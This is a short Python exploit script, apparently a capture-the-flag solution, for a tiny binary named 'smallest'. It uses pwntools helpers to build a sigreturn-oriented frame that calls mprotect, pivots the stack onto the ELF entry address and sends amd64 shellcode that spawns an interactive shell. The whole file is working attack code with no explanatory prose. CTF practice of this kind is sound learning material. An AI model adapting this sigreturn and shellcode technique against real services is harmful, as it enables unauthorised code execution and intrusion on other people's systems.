# File: exp.py
# Author: raycp
# Date: 2019-06-02
# Description: exp for smallest

from pwn_debug import *


pdbg=pwn_debug("./smallest")

pdbg.context.terminal=['tmux', 'splitw', '-h']

#pdbg.local()
pdbg.debug("2.23")
#pdbg.remote('127.0.0.1', 22)
#p=pdbg.run("local")
#p=pdbg.run("remote")
p=pdbg.run("debug")

membp=pdbg.membp
#print hex(membp.elf_base),hex(membp.libc_base)
elf=pdbg.elf
libc=pdbg.libc

#io_file=IO_FILE_plus()
#io_file.show()

def pwn():
    
    syscall_ret = 0x4000BE  #syscall; ret;
    vuln_func = 0x4000B0
    entry_addr = 0x400018   ## key here, elf header store the entry address
    frame = SigreturnFrame()
    frame.rax = 10  # mprotect
    frame.rdi = 0x400000
    frame.rsi = 0x1000
    frame.rdx = 0x7
    frame.rsp = entry_addr
    frame.rip = syscall_ret

    #pdbg.bp(0x4000BE)
    raw_input("step1 paylaod deploying>")
    payload=p64(vuln_func)+p64(0)+str(frame)  ## start over again to make rax to 15 
    p.send(payload)

    raw_input("step2 sigreturn call mprotect>")   
    payload=p64(syscall_ret)+p64(0)+str(frame)
    p.send(payload[:15])  ## read func return 15 which is sigreturn syscall number

    raw_input("step3 get shell>")
    payload=p64(entry_addr+0x10)+asm("add rsp,0x100")+asm(shellcraft.amd64.sh())

    p.send(payload)

    p.interactive() 

if __name__ == '__main__':
   pwn()


